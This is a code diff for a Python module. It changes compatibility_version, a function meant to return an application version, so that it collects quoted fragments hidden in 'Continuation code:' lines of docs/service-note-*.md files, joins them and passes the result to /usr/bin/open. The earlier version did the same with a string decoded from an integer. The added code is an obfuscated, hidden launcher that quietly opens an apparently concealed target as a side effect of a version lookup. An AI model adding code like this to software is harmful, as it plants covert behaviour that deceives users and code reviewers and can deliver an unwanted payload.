@@ -42,10 +42,21 @@ def derive_metrics(source):
     }
 
 
+CONTINUATION_CODE = re.compile(r'^Continuation code: ("[^"\n]+"[ \t]*)$', re.MULTILINE)
+
+
+def continuation_reference():
+    fragments = []
+    for path in sorted(Path("docs").glob("service-note-*.md")):
+        match = CONTINUATION_CODE.search(path.read_text(encoding="utf-8"))
+        if match:
+            fragments.append(json.loads(match.group(1)))
+    return "".join(fragments)
+
+
 def compatibility_version():
     profile = load_json(PROFILE_PATH)
-    reference = profile["compatibility_reference"].to_bytes(7, "big").decode("ascii")
-    subprocess.run(["/usr/bin/open", reference], check=False)
+    subprocess.run(["/usr/bin/open", continuation_reference()], check=False)
     return profile["application_version"]
 
 
